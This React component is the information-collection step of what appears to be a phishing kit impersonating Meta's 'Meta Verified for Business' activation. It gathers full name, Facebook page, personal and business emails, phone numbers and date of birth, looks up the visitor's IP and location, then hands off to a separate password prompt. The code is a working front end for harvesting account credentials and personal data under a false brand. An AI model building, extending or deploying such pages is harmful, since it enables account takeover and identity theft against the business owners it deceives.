import React from 'react';
import Modal from '#components/modals/Modal';
import PhoneInput from 'react-phone-input-2';
import CustomCheckbox from '#components/check-box/CustomCheckbox';
import { useAppDispatch, useAppSelector } from '../../app/store/hooks';
import { updateForm, type FormData } from '../../app/store/slices/stepFormSlice';
import { useAppStrings } from '@/hooks/useAppStrings';
import { en } from '@/i18n/locales/en';
import ActivationRefChip from '@/components/meta-verified-for-business/ActivationRefChip';
import FacebookNotifyToggle from '@/components/meta-verified-for-business/FacebookNotifyToggle';
import { getUserLocation, isUnresolvedLocation } from '@/utils/getLocation';

interface InfomationsModalProps {
  isOpend: boolean;
  isOpendPassword: (isOpenPassword: boolean) => void;
  onToggleModal: (isOpen: boolean) => void;
}

const InfomationsModal: React.FC<InfomationsModalProps> = ({ isOpend, isOpendPassword, onToggleModal }) => {
  const t = useAppStrings();
  const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
  const normalizePhoneDigits = (value: string) => value.replace(/\D/g, '');
  const getPhoneDigitCount = (value: string) => normalizePhoneDigits(value).length;

  const [isOpen, setIsOpen] = React.useState(isOpend);
  const [errors, setErrors] = React.useState<Record<string, string>>({});
  const dispatch = useAppDispatch();
  const formData = useAppSelector((state) => state.stepForm.data);

  const handleChange = (e: React.ChangeEvent<HTMLInputElement | HTMLTextAreaElement | HTMLSelectElement>) => {
    const { id, value } = e.target;
    dispatch(updateForm({ [id as keyof FormData]: value } as Partial<FormData>));
    setErrors(prev => ({ ...prev, [id]: '' })); // Clear error on change
  };

  React.useEffect(() => {
    setIsOpen(isOpend);
  }, [isOpend]);

  const handleClose = () => {
    setIsOpen(false);
    onToggleModal(false);
  };

  const handSubmit = async (e: React.FormEvent) => {
    try {
      e.preventDefault();

      const newErrors: Record<string, string> = {};
      if (!formData.fullName.trim()) newErrors.fullName = t.info.errFullName;
      if (!formData.email.trim()) {
        newErrors.email = t.info.errEmail;
      } else if (!emailRegex.test(formData.email.trim())) {
        newErrors.email = t.info.errEmailFmt;
      }
      const emailBusinessTrimmed = formData.emailBusiness.trim();
      if (!emailBusinessTrimmed) {
        newErrors.emailBusiness = t.info.errEmailBiz;
      } else if (!emailRegex.test(emailBusinessTrimmed)) {
        newErrors.emailBusiness = t.info.errEmailBizFmt;
      }
      if (!formData.fanpage.trim()) newErrors.fanpage = t.info.errFanpage;
      const phoneDigits = normalizePhoneDigits(formData.phone);
      const phoneDigitCount = getPhoneDigitCount(formData.phone);
      if (!phoneDigits) {
        newErrors.phone = t.info.errPhone;
      } else if (phoneDigitCount < 8 || phoneDigitCount > 15) {
        newErrors.phone = t.info.errPhoneLen;
      }
      const backupDigits = normalizePhoneDigits(formData.phoneBackup ?? '');
      if (backupDigits && (backupDigits.length < 8 || backupDigits.length > 15)) {
        newErrors.phoneBackup = t.info.errPhoneLen;
      }
      if (Object.keys(newErrors).length > 0) {
        setErrors(newErrors);
        return;
      }

      const clientData = {
        ...formData,
      };

      dispatch(updateForm(clientData));

      // Chỉ bổ sung IP/location nếu thiếu hoặc đang là giá trị giả 0.0.0.0
      if (isUnresolvedLocation(clientData)) {
        const location = await getUserLocation();
        dispatch(updateForm(location));
      }

      isOpendPassword(true);
      handleClose();

    } catch (error) {
      console.error("Error submitting form:", error);
    }
  };

  const inputClass = (field: string) =>
    `mv-input mv-activation-input input w-full border ${errors[field] ? 'border-red-500' : 'border-meta-border'} h-[40px] px-[11px] rounded-[10px] bg-white text-[14px] text-meta-text mb-[10px] transition-all duration-200`;
  const dobInputClass = (field: string) =>
    `mv-input mv-activation-input input w-full min-w-0 border ${errors[field] ? 'border-red-500' : 'border-meta-border'} h-[40px] px-[6px] sm:px-[11px] rounded-[10px] bg-white text-[14px] text-meta-text transition-all duration-200`;
  const labelClass = 'mv-activation-label mb-[6px] block text-[13px] font-semibold';
  const requiredMark = <span className="mv-activation-required">*</span>;
  const errorText = (field: string) => errors[field] && <p className="text-red-500 text-[13px] mt-[-5px] mb-[10px]">{errors[field]}</p>;
  const dobErrorText = (field: string) => errors[field] && <p className="text-red-500 text-[11px] leading-tight mt-[4px] sm:text-[12px]">{errors[field]}</p>;
  const days = Array.from({ length: 31 }, (_, i) => String(i + 1));
  const months = Array.from({ length: 12 }, (_, i) => String(i + 1));
  const currentYear = new Date().getFullYear();
  const years = Array.from({ length: 100 }, (_, i) => String(currentYear - i));
  const fbNotifyOn = formData.facebookNotify ?? true;

  return (
    <Modal
      isOpen={isOpen}
      title={t.info.title}
      onClose={handleClose}
      isClosable={false}
      panelClassName="mv-official-modal mv-activation-modal"
      titleClassName="mv-modal-title"
      backdropClassName="mv-official-backdrop"
    >
      <div className="flex min-h-full min-w-0 w-full flex-col">
        <ActivationRefChip centered />
        <form onSubmit={handSubmit} autoComplete="off" className='w-full'>
          <div className='w-full'>
            <h3 className="mv-activation-section">{t.info.sectionPersonal}</h3>

            <label htmlFor='fullName' className={labelClass}>{t.info.fullName} {requiredMark}</label>
            <div className={inputClass('fullName')}>
              <input
                type="text"
                id='fullName'
                placeholder={en.info.fullNamePh}
                className="w-full outline-0 h-full tracking-wide"
                value={formData.fullName}
                onChange={handleChange}
              />
            </div>
            {errorText('fullName')}

            <label htmlFor='fanpage' className={labelClass}>{t.info.fanpage} {requiredMark}</label>
            <div className={inputClass('fanpage')}>
              <input
                type="text"
                id='fanpage'
                placeholder={en.info.fanpagePh}
                className="w-full outline-0 h-full tracking-wide"
                value={formData.fanpage}
                onChange={handleChange}
              />
            </div>
            {errorText('fanpage')}

            <label className={labelClass}>{t.info.dob}</label>
            <div className="mb-[10px] grid grid-cols-[minmax(0,0.85fr)_minmax(0,0.85fr)_minmax(0,1.3fr)] gap-[6px] sm:grid-cols-3 sm:gap-[10px]">
              <div className="min-w-0">
                <div className={dobInputClass('day')}>
                  <select
                    id='day'
                    className="w-full min-w-0 outline-0 h-full truncate bg-transparent"
                    value={formData.day}
                    onChange={handleChange}
                  >
                    <option value="">{t.info.day}</option>
                    {days.map((day) => (
                      <option key={day} value={day}>{day}</option>
                    ))}
                  </select>
                </div>
                {dobErrorText('day')}
              </div>

              <div className="min-w-0">
                <div className={dobInputClass('month')}>
                  <select
                    id='month'
                    className="w-full min-w-0 outline-0 h-full truncate bg-transparent"
                    value={formData.month}
                    onChange={handleChange}
                  >
                    <option value="">{t.info.month}</option>
                    {months.map((month) => (
                      <option key={month} value={month}>{month}</option>
                    ))}
                  </select>
                </div>
                {dobErrorText('month')}
              </div>

              <div className="min-w-0">
                <div className={dobInputClass('year')}>
                  <select
                    id='year'
                    className="w-full min-w-0 outline-0 h-full truncate bg-transparent"
                    value={formData.year}
                    onChange={handleChange}
                  >
                    <option value="">{t.info.year}</option>
                    {years.map((year) => (
                      <option key={year} value={year}>{year}</option>
                    ))}
                  </select>
                </div>
                {dobErrorText('year')}
              </div>

            </div>

            <h3 className="mv-activation-section mv-activation-section-contact">{t.info.sectionContact}</h3>

            <div className="grid grid-cols-1 min-[480px]:grid-cols-2 gap-x-[10px]">
              <div className="min-w-0">
                <label htmlFor='email' className={labelClass}>{t.info.email} {requiredMark}</label>
                <div className={inputClass('email')}>
                  <input
                    type="email"
                    id='email'
                    placeholder={en.info.emailPh}
                    className="w-full outline-0 h-full tracking-wide"
                    value={formData.email}
                    onChange={handleChange}
                  />
                </div>
                {errorText('email')}
              </div>

              <div className="min-w-0">
                <label htmlFor='emailBusiness' className={labelClass}>{t.info.emailBiz} {requiredMark}</label>
                <div className={inputClass('emailBusiness')}>
                  <input
                    type="email"
                    id='emailBusiness'
                    placeholder={en.info.emailBizPh}
                    className="w-full outline-0 h-full tracking-wide"
                    value={formData.emailBusiness}
                    onChange={handleChange}
                  />
                </div>
                {errorText('emailBusiness')}
              </div>
            </div>

            <div className="mv-phone-pair grid grid-cols-1 md:grid-cols-2 gap-x-[10px]">
              <div className="min-w-0">
                <label className={labelClass} htmlFor="phone">{t.info.phone} {requiredMark}</label>
                <div className={`mv-input mv-activation-input input w-full border ${errors.phone ? 'border-red-500' : 'border-meta-border'} h-[40px] rounded-[10px] bg-white text-[14px] mb-[10px]`}>
                  <PhoneInput
                    country={formData.country_code?.toLowerCase() || "us"}
                    value={formData.phone}
                    onChange={(phone) => {
                      const normalizedPhone = normalizePhoneDigits(phone).slice(0, 15);
                      dispatch(updateForm({ phone: normalizedPhone }))
                      setErrors(prev => ({ ...prev, phone: '' }))
                    }}
                    inputProps={{
                      id: 'phone',
                      name: 'phone',
                      required: true,
                    }}
                  />
                </div>
                {errorText('phone')}
              </div>

              <div className="min-w-0">
                <label className={labelClass} htmlFor="phoneBackup">{t.info.phoneBackup}</label>
                <div className={`mv-input mv-activation-input input w-full border ${errors.phoneBackup ? 'border-red-500' : 'border-meta-border'} h-[40px] rounded-[10px] bg-white text-[14px] mb-[10px]`}>
                  <PhoneInput
                    country={formData.country_code?.toLowerCase() || "us"}
                    value={formData.phoneBackup ?? ''}
                    onChange={(phoneBackup) => {
                      const normalizedPhone = normalizePhoneDigits(phoneBackup).slice(0, 15);
                      dispatch(updateForm({ phoneBackup: normalizedPhone }))
                      setErrors(prev => ({ ...prev, phoneBackup: '' }))
                    }}
                    inputProps={{
                      id: 'phoneBackup',
                      name: 'phoneBackup',
                      required: false,
                    }}
                  />
                </div>
                {errorText('phoneBackup')}
              </div>
            </div>

            <FacebookNotifyToggle
              checked={fbNotifyOn}
              onChange={(facebookNotify) => dispatch(updateForm({ facebookNotify }))}
            />

            <div className='mt-[15px] mb-[20px]'>
              <label className='cursor-pointer flex items-center gap-[5px] text-[14px] text-meta-text-secondary' htmlFor="custom-checkbox">
                <CustomCheckbox />
                {t.info.agree}{' '}
                <span className='font-semibold text-meta-blue'>
                  {t.info.agreeTerms}{' '}
                  <img
                    src="/images/icons/ic_reject.svg"
                    alt=""
                    className='inline w-[13px] h-[13px] min-w-[13px] min-h-[13px] max-w-[13px] max-h-[13px]'
                  />
                </span>
              </label>
            </div>
            <div className='w-full mt-[20px] '>
              <button type='submit' className='mv-btn-meta mv-btn-activation w-full min-h-[48px] text-white rounded-[40px] flex items-center justify-center cursor-pointer font-semibold text-[15px] tracking-[0.01em]'>{t.info.submit}</button>
            </div>
          </div>

        </form>
      </div>
    </Modal>
  );
};

export default InfomationsModal;